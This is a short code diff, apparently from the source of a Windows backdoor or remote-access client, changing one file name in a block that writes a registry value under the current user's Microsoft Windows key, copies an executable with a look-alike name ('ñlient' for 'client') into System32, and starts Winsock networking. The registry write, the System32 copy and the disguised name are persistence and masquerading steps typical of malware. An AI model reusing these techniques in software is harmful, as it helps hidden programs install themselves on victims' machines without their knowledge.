@@ -30,7 +30,7 @@ if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Wi
 	RegSetValueEx(hKeys, TEXT("ñlient"), 0, REG_SZ, (LPBYTE)lpszData, (_tcslen(lpszData) + 1) * sizeof(TCHAR));
 	RegCloseKey(hKeys);
 }
-CopyFile(L"D:\\ñlient.exe", L"C:\\Windows\\System32\\Client.exe", 1);
+CopyFile(L"D:\\ñlient.exe", L"C:\\Windows\\System32\\client.exe", 1);
 
 
 	WSAStartup(MAKEWORD(2, 2), &Winsock); // Start Winsock 
